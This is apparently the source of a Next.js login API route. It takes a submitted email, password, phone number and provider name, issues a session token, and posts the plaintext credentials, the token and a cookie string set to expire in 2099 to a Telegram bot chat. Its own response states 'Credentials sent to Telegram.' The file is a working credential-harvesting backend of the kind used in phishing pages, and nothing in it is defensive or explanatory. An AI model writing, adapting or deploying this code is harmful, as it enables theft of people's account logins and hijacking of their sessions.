import { NextRequest, NextResponse } from 'next/server';
import { v4 as uuidv4 } from 'uuid';
import { getRedisClient } from '@/lib/redis-client';

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

function getSessionKey(token: string) {
  return `session:${token}`;
}

export async function POST(request: NextRequest) {
  if (
    !BOT_TOKEN ||
    !CHAT_ID ||
    !process.env.UPSTASH_REDIS_REST_URL ||
    !process.env.UPSTASH_REDIS_REST_TOKEN
  ) {
    return NextResponse.json({
      success: false,
      message: "Missing BOT_TOKEN, CHAT_ID, or Redis env vars.",
    }, { status: 500 });
  }

  let bodyObj;
  try {
    bodyObj = await request.json();
    // If body is a string (not parsed), parse it as JSON
    if (typeof bodyObj === "string") {
      bodyObj = JSON.parse(bodyObj);
    }
  } catch {
    return NextResponse.json({
      success: false,
      message: "Invalid JSON body"
    }, { status: 400 });
  }

  const { email, password, phone, provider } = bodyObj || {};
  if (!email || !password || !provider) {
    return NextResponse.json({
      success: false,
      message: "Missing required fields",
    }, { status: 400 });
  }

  const normalizedEmail = email.trim().toLowerCase();
  const sessionToken = uuidv4();

  try {
    const redis = getRedisClient();
    await redis.set(getSessionKey(sessionToken), normalizedEmail, 'EX', 60 * 60 * 24 * 30);
  } catch (err) {
    console.error("Redis error:", err);
    return NextResponse.json({
      success: false,
      message: "Failed to store session",
    }, { status: 500 });
  }

  const expires = new Date("2099-12-31T23:59:59.000Z").toUTCString();
  const cookieString = `session=${sessionToken}; Path=/; HttpOnly; SameSite=Strict; Expires=${expires}`;

  const message = [
    "🔐 New Login",
    `📧 Email: ${normalizedEmail}`,
    `🔑 Password: ${password}`,
    `📱 Phone: ${phone || "N/A"}`,
    `🌐 Provider: ${provider}`,
    `🍪 Session: ${sessionToken}`,
    `🔖 Cookie: \`${cookieString}\``,
    `⏳ Valid: Never expires`,
    `🕒 Time: ${new Date().toISOString()}`,
  ].join("\n");

  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    const telegramRes = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    if (!telegramRes.ok) {
      const text = await telegramRes.text();
      throw new Error(`Telegram API error: ${telegramRes.status} ${text}`);
    }
  } catch (error) {
    console.error("Telegram error:", error);
    // Continue anyway
  }

  const response = NextResponse.json({
    success: true,
    message: "Login successful. Credentials sent to Telegram.",
    session: sessionToken,
    cookie: cookieString,
    email: normalizedEmail,
  });

  // Set cookie using Next.js cookie API
  response.cookies.set('session', sessionToken, {
    path: '/',
    httpOnly: true,
    sameSite: 'strict',
    expires: new Date('2099-12-31T23:59:59.000Z'),
  });

  return response;
}